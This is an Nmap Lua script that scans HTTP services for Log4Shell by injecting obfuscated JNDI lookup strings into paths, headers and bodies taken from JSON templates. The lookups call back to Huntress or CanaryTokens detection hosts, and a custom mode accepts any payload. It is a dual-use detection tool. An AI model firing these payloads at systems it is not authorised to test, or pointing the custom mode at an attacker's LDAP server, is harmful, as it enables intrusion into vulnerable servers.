local nmap = require "nmap"
local http = require "http"
local shortport = require "shortport"
local json = require "json"
local stdnse = require "stdnse"
local string = require "string"
local open = io.open

description = [[
  Injects a Huntress log4shell payload in HTTP requests described by JSON templates.
  Results expire after 30 minutes.
  
  References:
    - https://log4shell.huntress.com/
]]

author = "Luciano Righetti"
license = "GPLv3"
categories = {"discovery", "exploit"}

portrule = function(host, port)
  return true
end

local function read_templates(path)
    local file = open(path, "r")
    if not file then return nil end
    local content = file:read "*a"
    _, templates = json.parse(content)
    file:close()
    return templates
end

local function get_payload(mode, id)
    -- Huntress payload
    if mode == "huntress" then
        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4shell.huntress.com:1389/%s}"):format(id)
    end

    -- CanaryToken payload
    if mode == "canary_tokens" then
        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
    end

    return nil
end

action = function(host, port)

    local mode = stdnse.get_script_args("mode")
    if mode == nil then
        return "ERROR: missing `mode` argument, should be `huntress`, `canary_tokens` or `custom`."
    end
    
    local id = stdnse.get_script_args("id")
    if stdnse.get_script_args("id") == nil then
        if mode == "huntress" then
            return "ERROR: missing Huntress id, grab the uuid from https://log4shell.huntress.com/ and add it via --script-args id=<uuid>."
        end
        if mode == "canary_tokens" then
            return "ERROR: missing CanaryTokens id, go to https://canarytokens.org/generate and generate a Log4Shell token and add it via --script-args id=<id>."
        end

        return "ERROR: missing id, add it via --script-args id=<id>."
    end

    local payload = nil
    if (mode == "custom" and stdnse.get_script_args("payload") ~= nil) then
        payload = ("${%s}"):format(stdnse.get_script_args("payload"))
        payload = payload:format(id)
    else
        payload = get_payload(mode, id)
    end
    if payload == nil then return "ERROR: invalid mode or id" end
        
    -- load injection templates
    local templates_path = stdnse.get_script_args("templates") or "templates.json"
    local templates = read_templates(templates_path)

    -- send requests
    for _, t in ipairs(templates) do
        
        -- default http options
        local options = {
            bypass_cache = true,
            no_cache = true,
            header = {}
        }

        -- build method
        local method = t["method"] or "GET"
        
        -- build path / query strings
        local path = t["path"] or "/";
        path = string.gsub(path, "{payload}", payload)
        
        -- build headers
        if t["headers"] ~= nil then
            for _, h in ipairs(t["headers"]) do
                options["header"][h["name"]] = string.gsub(h["format"], "{payload}", payload)
            end
        end
        
        -- build body
        if t["body"] ~= nil then
            options["content"] = string.gsub(t["body"], "{payload}", payload)
        end
        
        stdnse.debug1("[*] Sending request to %s with tempate id=%s", host.targetname or host.ip, t["id"])
        http.generic_request(
            host.targetname or host.ip, 
            port,
            method,
            path,
            options
        )
    
    end

    if mode == "huntress" then
        return ("Check https://log4shell.huntress.com/view/%s for results."):format(id)
    end

    if mode == "canary_tokens" then
        return ("Check your email/webhook for CanaryTokens results with id=%s."):format(id)
    end

    if mode == "custom" then
        return ("Custom mode with id=%s."):format(id)
    end

end
